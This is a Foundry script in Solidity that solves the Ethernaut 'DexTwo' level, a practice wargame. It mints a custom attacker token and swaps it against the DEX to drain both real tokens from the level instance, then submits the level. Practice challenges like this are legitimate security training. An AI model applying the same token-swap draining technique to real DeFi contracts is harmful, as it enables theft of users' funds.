// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import { Script, console2 } from "forge-std/Script.sol";
import { Vm } from "forge-std/Vm.sol";
import { Ethernaut } from "src/interfaces/IEthernaut.sol";
import { DexTwo, SwappableTokenTwo } from "src/Level23.sol";
import { AttackToken } from "src/Level23Attack.sol";

contract Attack is Script {
    Ethernaut ethernaut = Ethernaut(vm.envAddress("ETHERNAUT"));

    function run() public {
        uint256 deployerPrivateKey = uint256(vm.envBytes32("DEPLOYER_PRIVATE_KEY"));
        vm.startBroadcast(deployerPrivateKey);
        vm.recordLogs();
        ethernaut.createLevelInstance(0xf59112032D54862E199626F55cFad4F8a3b0Fce9);
        Vm.Log[] memory entries = vm.getRecordedLogs();
        address instanceAddress = address(uint160(uint256(entries[11].topics[2])));
        console2.log(instanceAddress);
        DexTwo instance = DexTwo(instanceAddress);

        SwappableTokenTwo token1 = SwappableTokenTwo(instance.token1());
        SwappableTokenTwo token2 = SwappableTokenTwo(instance.token2());
        AttackToken attack = new AttackToken(instanceAddress, "BRUH", "BRH", 1000);
        attack.approve(instanceAddress, 1000);
        attack.transfer(instanceAddress, token1.balanceOf(instanceAddress));
        instance.swap(address(attack), instance.token1(), token1.balanceOf(instanceAddress));
        attack.transferFrom(
            instanceAddress, attack.owner(), attack.balanceOf(instanceAddress) - token2.balanceOf(instanceAddress)
        );
        instance.swap(address(attack), instance.token2(), token2.balanceOf(instanceAddress));

        console2.log(token1.balanceOf(instanceAddress));
        console2.log(token2.balanceOf(instanceAddress));
        require(token1.balanceOf(instanceAddress) == 0 && token2.balanceOf(instanceAddress) == 0, "Attack failed");

        ethernaut.submitLevelInstance(instanceAddress);
        vm.stopBroadcast();
    }
}
